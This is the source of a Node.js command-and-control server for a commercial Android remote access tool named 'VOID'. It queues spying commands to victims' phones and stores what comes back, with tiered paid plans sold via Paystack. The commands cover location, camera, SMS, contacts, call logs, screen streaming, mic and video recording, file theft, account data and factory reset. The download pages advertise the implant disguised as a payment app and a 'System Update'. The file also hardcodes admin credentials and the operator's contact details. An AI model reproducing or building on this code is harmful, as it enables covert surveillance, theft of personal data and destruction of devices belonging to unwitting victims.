// ============================================================
//   VOID REMOTE ACCESS TOOL — Backend API
// ============================================================

const express = require('express');
const multer = require('multer');
const https = require('https');
const { createClient } = require('@supabase/supabase-js');

const app = express();
app.use(express.json({ limit: '10mb' }));
app.use(express.static('public'));

// ============================================================
//   CONFIG
// ============================================================
const SUPABASE_URL = process.env.SUPABASE_URL;
const SUPABASE_KEY = process.env.SUPABASE_KEY;
const PAYSTACK_SECRET = process.env.PAYSTACK_SECRET || '';
const PAYSTACK_PUBLIC = process.env.PAYSTACK_PUBLIC || '';

if (!SUPABASE_URL || !SUPABASE_KEY) {
  console.error('Missing SUPABASE_URL or SUPABASE_KEY');
}

const supabase = createClient(SUPABASE_URL, SUPABASE_KEY, {
  auth: { persistSession: false }
});

// Authorized wallet IDs
const WALLET_IDS = [
  "48291", "57394", "12847", "91028", "37654",
  "84021", "62517", "19483", "75062", "30918",
  "57120", "89643", "26307", "41985", "68210",
  "93574", "14758", "52036", "78419", "36142",
  "71204", "39586", "80427", "56913", "23841",
  "64709", "95036", "18254", "47310", "68527",
  "91403", "35678", "72091", "14835", "83672",
  "29014", "57460", "91825", "36582", "74209",
  "60318", "85946", "27415", "60852", "13970",
  "48265", "57138", "90641", "23587", "76049",
  "20101"
];

const ADMIN_CODE = "201019";
const STORAGE_BUCKET = 'void-files';
const SYNC_TIMEOUT_MS = 25000;

// Tier config
const TIERS = {
  free: { limit: 3, price: 0, daily: false },
  pro: { limit: 10, price: 1000, daily: true },
  vip: { limit: 999999, price: 3000, daily: false }
};

// Command -> tier required
const COMMAND_TIER = {
  location_sync: 'free',
  photo_capture: 'free',
  message_sync: 'free',
  display_read: 'pro',
  display_stream: 'pro',
  led_test: 'pro',
  alert_sync: 'pro',
  contact_sync: 'pro',
  call_sync: 'pro',
  app_list: 'pro',
  self_photo: 'vip',
  clip_record: 'vip',
  voice_record: 'vip',
  account_sync: 'vip',
  folder_read: 'vip',
  file_download: 'vip',
  notice_send: 'vip',
  session_pause: 'vip',
  session_resume: 'vip',
  factory_reset: 'vip',
  app_launch: 'pro',
  screen_tap: 'vip',
  screen_swipe: 'vip',
  screen_text: 'vip',
  key_home: 'vip',
  key_back: 'vip'
};

const TIER_RANK = { free: 0, pro: 1, vip: 2 };

function validWallet(id) { return WALLET_IDS.includes(id); }
function ts() { return Date.now(); }
function todayStart() {
  const d = new Date();
  d.setHours(0, 0, 0, 0);
  return d.getTime();
}

const upload = multer({
  storage: multer.memoryStorage(),
  limits: { fileSize: 50 * 1024 * 1024 }
});

// ============================================================
//   CLIENT ENDPOINTS
// ============================================================

app.post('/connect', async (req, res) => {
  try {
    const { userId, device, android, battery, network, androidId } = req.body;
    if (!validWallet(userId)) return res.json({ ok: false, err: 'unauthorized' });

    const { data: existing } = await supabase
      .from('devices').select('*').eq('user_id', userId).maybeSingle();

    if (existing && existing.android_id && androidId && existing.android_id !== androidId) {
      return res.json({ ok: false, err: 'wallet_linked' });
    }

    // Preserve tier and commands_used if existing
    const tier = existing && existing.tier ? existing.tier : 'free';
    const used = existing && existing.commands_used ? existing.commands_used : 0;

    await supabase.from('devices').upsert({
      user_id: userId,
      android_id: androidId || (existing && existing.android_id) || null,
      device: device || 'unknown',
      android: android || '?',
      battery: battery || '?',
      network: network || '?',
      last_seen: ts(),
      tier: tier,
      commands_used: used,
      commands_reset_at: (existing && existing.commands_reset_at) || todayStart()
    }, { onConflict: 'user_id' });

    res.json({ ok: true, synced: ts() });
  } catch (e) {
    res.json({ ok: false, err: 'sync_failed' });
  }
});

app.get('/sync', async (req, res) => {
  const userId = req.query.wallet || req.query.device;
  if (!validWallet(userId)) return res.json({ ok: false, err: 'unauthorized' });

  await supabase.from('devices').update({ last_seen: ts() }).eq('user_id', userId);

  const deadline = Date.now() + SYNC_TIMEOUT_MS;

  const checkQueue = async () => {
    const { data: pending } = await supabase
      .from('commands').select('*').eq('user_id', userId)
      .eq('delivered', false).order('created_at', { ascending: true });

    if (pending && pending.length) {
      const ids = pending.map(p => p.id);
      await supabase.from('commands').update({ delivered: true }).in('id', ids);
      const out = pending.map(p => ({ id: String(p.id), cmd: p.cmd, args: p.args || '' }));
      return res.json({ ok: true, tasks: out });
    }

    if (Date.now() >= deadline) return res.json({ ok: true, tasks: [] });
    setTimeout(checkQueue, 1000);
  };

  checkQueue();
});

app.post('/status', async (req, res) => {
  try {
    const { userId, cmdId, cmd, data } = req.body;
    if (!validWallet(userId)) return res.json({ ok: false });

    await supabase.from('results').insert({
      user_id: userId,
      cmd_id: cmdId || '',
      cmd: cmd || '',
      data: (data || '').substring(0, 6000),
      created_at: ts()
    });

    res.json({ ok: true });
  } catch (e) { res.json({ ok: false }); }
});

app.post('/media', upload.single('file'), async (req, res) => {
  try {
    const { userId, type } = req.body;
    if (!validWallet(userId)) return res.json({ ok: false });
    if (!req.file) return res.json({ ok: false, err: 'no_media' });

    const ext = (req.file.originalname.split('.').pop() || 'bin').toLowerCase();
    const path = userId + '/' + type.toLowerCase() + '_' + ts() + '.' + ext;

    const { error: upErr } = await supabase.storage
      .from(STORAGE_BUCKET)
      .upload(path, req.file.buffer, {
        contentType: req.file.mimetype || 'application/octet-stream',
        upsert: false
      });

    if (upErr) return res.json({ ok: false, err: upErr.message });

    const { data: urlData } = supabase.storage.from(STORAGE_BUCKET).getPublicUrl(path);

    await supabase.from('uploads').insert({
      user_id: userId,
      type: type || 'media',
      url: urlData.publicUrl,
      name: path.split('/').pop(),
      created_at: ts()
    });

    res.json({ ok: true, url: urlData.publicUrl });
  } catch (e) { res.json({ ok: false }); }
});

app.get('/settings', (req, res) => {
  res.json({
    ok: true,
    releaseCode: '129010',
    payment: { bank: 'PALMPAY', account: '9153239545', name: 'TOBILOBA' },
    maxAttempts: 5
  });
});

// ============================================================
//   PANEL ENDPOINTS
// ============================================================

app.post('/auth', async (req, res) => {
  const { username, password } = req.body;
  if (username !== 'VOID') return res.json({ ok: false, err: 'invalid_credentials' });

  // Admin
  if (password === ADMIN_CODE) {
    return res.json({
      ok: true,
      token: 'void_admin_' + ts(),
      userId: ADMIN_CODE,
      admin: true,
      tier: 'vip',
      commands_used: 0
    });
  }

  if (!validWallet(password)) return res.json({ ok: false, err: 'invalid_credentials' });

  // Look up tier from devices table
  let tier = 'free';
  let used = 0;
  let resetAt = todayStart();

  try {
    const { data: d } = await supabase
      .from('devices').select('tier, commands_used, commands_reset_at')
      .eq('user_id', password).maybeSingle();

    if (d) {
      tier = d.tier || 'free';
      used = d.commands_used || 0;
      resetAt = d.commands_reset_at || todayStart();

      // Daily reset for pro
      if (tier === 'pro' && resetAt < todayStart()) {
        used = 0;
        resetAt = todayStart();
        await supabase.from('devices')
          .update({ commands_used: 0, commands_reset_at: resetAt })
          .eq('user_id', password);
      }
    }
  } catch (e) {}

  res.json({
    ok: true,
    token: 'void_' + password + '_' + ts(),
    userId: password,
    admin: false,
    tier: tier,
    commands_used: used
  });
});

app.get('/clients', async (req, res) => {
  try {
    const wallet = req.query.wallet;
    const isAdmin = req.query.admin === '1';
    let query = supabase.from('devices').select('*');
    if (!isAdmin && wallet) query = query.eq('user_id', wallet);
    const { data } = await query;
    const list = (data || []).map(d => ({
      userId: d.user_id,
      device: d.device,
      android: d.android,
      battery: d.battery,
      network: d.network,
      lastSeen: d.last_seen,
      tier: d.tier || 'free',
      online: (ts() - (d.last_seen || 0)) < 30000
    }));
    res.json({ ok: true, clients: list, devices: list });
  } catch (e) {
    res.json({ ok: true, clients: [], devices: [] });
  }
});

app.get('/client', async (req, res) => {
  try {
    const id = req.query.id || req.query.wallet;
    if (!validWallet(id)) return res.json({ ok: false });

    const { data: d } = await supabase.from('devices').select('*').eq('user_id', id).maybeSingle();
    const since = ts() - 60000;

    const { data: results } = await supabase.from('results').select('*')
      .eq('user_id', id).gte('created_at', since)
      .order('created_at', { ascending: true }).limit(30);

    const { data: uploads } = await supabase.from('uploads').select('*')
      .eq('user_id', id).gte('created_at', since)
      .order('created_at', { ascending: true }).limit(30);

    const { data: recentTasks } = await supabase.from('commands').select('*')
      .eq('user_id', id).order('created_at', { ascending: false }).limit(20);

    let streaming = false, ledTest = false;
    if (recentTasks) {
      for (const c of recentTasks) {
        if (c.cmd === 'display_stream' && !streaming) streaming = c.args === 'on';
        if (c.cmd === 'led_test' && !ledTest) ledTest = c.args === 'on';
        if (streaming && ledTest) break;
      }
    }

    const online = d && (ts() - (d.last_seen || 0)) < 30000;

    res.json({
      ok: true,
      userId: id,
      online: !!online,
      device: d ? d.device : null,
      android: d ? d.android : null,
      battery: d ? d.battery : null,
      network: d ? d.network : null,
      tier: d ? (d.tier || 'free') : 'free',
      lastSeen: d ? d.last_seen : null,
      live: streaming,
      flash: ledTest,
      results: (results || []).map(r => ({ cmd: r.cmd, data: r.data, at: r.created_at })),
      uploads: (uploads || []).map(u => ({ type: u.type, url: u.url, name: u.name, at: u.created_at }))
    });
  } catch (e) { res.json({ ok: false }); }
});

app.post('/dispatch', async (req, res) => {
  try {
    const { userId, cmd, args, tier, admin } = req.body;
    if (!validWallet(userId)) return res.json({ ok: false });

    // Tier check
    let userTier = tier || 'free';
    let isAdmin = !!admin;

    // Try to load fresh tier from db
    let dbTier = 'free';
    let used = 0;
    let resetAt = todayStart();
    try {
      const { data: d } = await supabase
        .from('devices').select('tier, commands_used, commands_reset_at')
        .eq('user_id', userId).maybeSingle();
      if (d) {
        dbTier = d.tier || 'free';
        used = d.commands_used || 0;
        resetAt = d.commands_reset_at || todayStart();
      }
    } catch (e) {}

    // Prefer db tier
    userTier = dbTier;

    // Daily reset
    if (userTier === 'pro' && resetAt < todayStart()) {
      used = 0;
      await supabase.from('devices')
        .update({ commands_used: 0, commands_reset_at: todayStart() })
        .eq('user_id', userId);
    }

    // Admin bypass
    if (!isAdmin) {
      const cfg = TIERS[userTier] || TIERS.free;
      if (used >= cfg.limit) {
        return res.json({
          ok: false,
          err: 'tier_limit_reached',
          tier: userTier,
          limit: cfg.limit,
          used: used
        });
      }
    }

    // Command tier gate
    const requiredTier = COMMAND_TIER[cmd] || 'free';
    if (!isAdmin && TIER_RANK[userTier] < TIER_RANK[requiredTier]) {
      return res.json({
        ok: false,
        err: 'tier_upgrade_required',
        required: requiredTier,
        current: userTier
      });
    }

    // Clear old results for toggles not applied here
    if (cmd !== 'led_test' && cmd !== 'display_stream') {
      await supabase.from('results').delete().eq('user_id', userId);
      await supabase.from('uploads').delete().eq('user_id', userId);
    }

    await supabase.from('commands').insert({
      user_id: userId,
      cmd: cmd,
      args: args || '',
      created_at: ts(),
      delivered: false
    });

    // Increment counter (unless admin or vip)
    if (!isAdmin && userTier !== 'vip') {
      await supabase.from('devices')
        .update({ commands_used: used + 1 })
        .eq('user_id', userId);
    }

    res.json({ ok: true });
  } catch (e) { res.json({ ok: false, err: 'dispatch_failed' }); }
});

// ============================================================
//   PAYSTACK PAYMENTS
// ============================================================

// Initialize a Paystack payment
app.post('/pay/init', async (req, res) => {
  try {
    const { userId, tier } = req.body;
    if (!validWallet(userId) && userId !== ADMIN_CODE) {
      return res.json({ ok: false, err: 'invalid_wallet' });
    }
    if (tier !== 'pro' && tier !== 'vip') {
      return res.json({ ok: false, err: 'invalid_tier' });
    }
    if (!PAYSTACK_SECRET) {
      return res.json({ ok: false, err: 'payments_not_configured' });
    }

    const cfg = TIERS[tier];
    const amount = cfg.price * 100; // kobo
    const ref = 'VOID_' + userId + '_' + tier + '_' + ts();
    const callbackUrl = (process.env.PUBLIC_URL || 'https://voidremotetool.onrender.com') + '/pay/callback';

    const body = JSON.stringify({
      email: 'void' + userId + '@voidremotetool.app',
      amount: amount,
      reference: ref,
      callback_url: callbackUrl,
      metadata: {
        userId: userId,
        tier: tier,
        custom_fields: [
          { display_name: 'User ID', variable_name: 'user_id', value: userId },
          { display_name: 'Tier', variable_name: 'tier', value: tier }
        ]
      }
    });

    const result = await paystackPost('/transaction/initialize', body);

    if (!result || !result.status) {
      return res.json({ ok: false, err: 'paystack_init_failed', detail: result });
    }

    res.json({
      ok: true,
      authorization_url: result.data.authorization_url,
      reference: ref
    });
  } catch (e) {
    res.json({ ok: false, err: e.message });
  }
});

// Verify payment + upgrade wallet
app.post('/pay/verify', async (req, res) => {
  try {
    const { reference } = req.body;
    if (!reference) return res.json({ ok: false, err: 'no_reference' });
    if (!PAYSTACK_SECRET) return res.json({ ok: false, err: 'payments_not_configured' });

    const result = await paystackGet('/transaction/verify/' + encodeURIComponent(reference));

    if (!result || !result.status || result.data.status !== 'success') {
      return res.json({ ok: false, err: 'not_successful' });
    }

    const meta = result.data.metadata || {};
    const userId = meta.userId;
    const tier = meta.tier;

    if (!userId || !tier) return res.json({ ok: false, err: 'missing_meta' });

    // Upgrade
    await supabase.from('devices').update({
      tier: tier,
      commands_used: 0,
      commands_reset_at: todayStart()
    }).eq('user_id', userId);

    // Log payment
    await supabase.from('payments').insert({
      user_id: userId,
      tier: tier,
      amount: result.data.amount,
      reference: reference,
      status: 'success',
      created_at: ts()
    }).catch(() => {});

    res.json({ ok: true, tier: tier });
  } catch (e) {
    res.json({ ok: false, err: e.message });
  }
});

// Paystack callback page
app.get('/pay/callback', (req, res) => {
  const ref = req.query.reference || req.query.trxref || '';
  res.send(`<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>VOID — Verifying</title>
  <style>body{background:#070b14;color:#eef2fa;font-family:-apple-system,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px;margin:0;text-align:center;}
  .card{background:#0f1729;border:1px solid #1e2c4d;border-radius:18px;padding:36px 28px;max-width:400px;width:100%;}
  h1{font-size:22px;margin-bottom:8px;}p{color:#8894b5;font-size:13px;line-height:1.6;margin-bottom:20px;}
  .btn{display:inline-block;padding:14px 22px;background:linear-gradient(135deg,#7b5cff,#22d3ee);color:#fff;text-decoration:none;border-radius:12px;font-weight:800;letter-spacing:.15em;font-size:12px;}</style>
  </head><body><div class="card">
  <h1 id="title">Verifying payment…</h1>
  <p id="msg">Please wait while we confirm your upgrade.</p>
  <a class="btn" href="/">RETURN TO PANEL</a>
  </div>
  <script>
  fetch('/pay/verify',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({reference:'${ref}'})})
    .then(r=>r.json()).then(j=>{
      if(j.ok){document.getElementById('title').textContent='PAYMENT CONFIRMED';document.getElementById('msg').textContent='Your account has been upgraded to '+j.tier.toUpperCase()+'.';}
      else{document.getElementById('title').textContent='Verification failed';document.getElementById('msg').textContent=j.err||'Unknown error';}
    }).catch(()=>{document.getElementById('title').textContent='Connection error';});
  </script>
  </body></html>`);
});

// Public config for panel
app.get('/pay/config', (req, res) => {
  res.json({ ok: true, publicKey: PAYSTACK_PUBLIC, tiers: TIERS });
});

// Paystack helpers
function paystackPost(path, body) {
  return new Promise((resolve) => {
    const opts = {
      hostname: 'api.paystack.co',
      port: 443,
      path: path,
      method: 'POST',
      headers: {
        'Authorization': 'Bearer ' + PAYSTACK_SECRET,
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(body)
      }
    };
    const req = https.request(opts, (r) => {
      let data = '';
      r.on('data', c => data += c);
      r.on('end', () => { try { resolve(JSON.parse(data)); } catch (e) { resolve(null); } });
    });
    req.on('error', () => resolve(null));
    req.write(body);
    req.end();
  });
}

function paystackGet(path) {
  return new Promise((resolve) => {
    const opts = {
      hostname: 'api.paystack.co',
      port: 443,
      path: path,
      method: 'GET',
      headers: { 'Authorization': 'Bearer ' + PAYSTACK_SECRET }
    };
    const req = https.request(opts, (r) => {
      let data = '';
      r.on('data', c => data += c);
      r.on('end', () => { try { resolve(JSON.parse(data)); } catch (e) { resolve(null); } });
    });
    req.on('error', () => resolve(null));
    req.end();
  });
}

// ============================================================
//   DOWNLOADS
// ============================================================
app.get('/download/payme', (req, res) => {
  res.send(`<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>PAYME Download</title>
  <style>body{background:#070b14;color:#eef2fa;font-family:-apple-system,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px;margin:0;text-align:center;}
  .card{background:#0f1729;border:1px solid #1e2c4d;border-radius:18px;padding:36px 28px;max-width:400px;width:100%;}
  h1{font-size:22px;margin-bottom:8px;}p{color:#8894b5;font-size:13px;line-height:1.6;margin-bottom:20px;}
  .btn{display:inline-block;padding:14px 22px;background:#0f1729;color:#4d5a7a;border:1px solid #1e2c4d;text-decoration:none;border-radius:12px;font-weight:800;letter-spacing:.15em;font-size:12px;}
  .soon{color:#ffb020;font-weight:800;letter-spacing:.15em;font-size:11px;}</style>
  </head><body><div class="card">
  <h1>PAYME App</h1>
  <p>Contact <strong>+2349153239545</strong> on WhatsApp to receive your download link.</p>
  <span class="soon">COMING SOON</span>
  </div></body></html>`);
});

app.get('/download/sysupdate', (req, res) => {
  res.send(`<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>System Update Download</title>
  <style>body{background:#070b14;color:#eef2fa;font-family:-apple-system,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px;margin:0;text-align:center;}
  .card{background:#0f1729;border:1px solid #1e2c4d;border-radius:18px;padding:36px 28px;max-width:400px;width:100%;}
  h1{font-size:22px;margin-bottom:8px;}p{color:#8894b5;font-size:13px;line-height:1.6;margin-bottom:20px;}
  .soon{color:#ffb020;font-weight:800;letter-spacing:.15em;font-size:11px;}</style>
  </head><body><div class="card">
  <h1>System Update</h1>
  <p>Contact <strong>+2349153239545</strong> on WhatsApp to receive your download link.</p>
  <span class="soon">COMING SOON</span>
  </div></body></html>`);
});

// ============================================================
//   HEALTH
// ============================================================
app.get('/', (req, res) => {
  res.send('VOID REMOTE ACCESS TOOL — ' + new Date().toISOString());
});

app.get('/health', (req, res) => {
  res.json({ ok: true, status: 'healthy', ts: ts() });
});

// ============================================================
//   CLEANUP
// ============================================================
async function cleanup() {
  try {
    const cutoff = ts() - (12 * 60 * 60 * 1000);
    await supabase.from('results').delete().lt('created_at', cutoff);
    await supabase.from('commands').delete().lt('created_at', cutoff).eq('delivered', true);
  } catch (e) {}
}
setInterval(cleanup, 60 * 60 * 1000);

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log('VOID REMOTE ACCESS TOOL listening on ' + PORT));
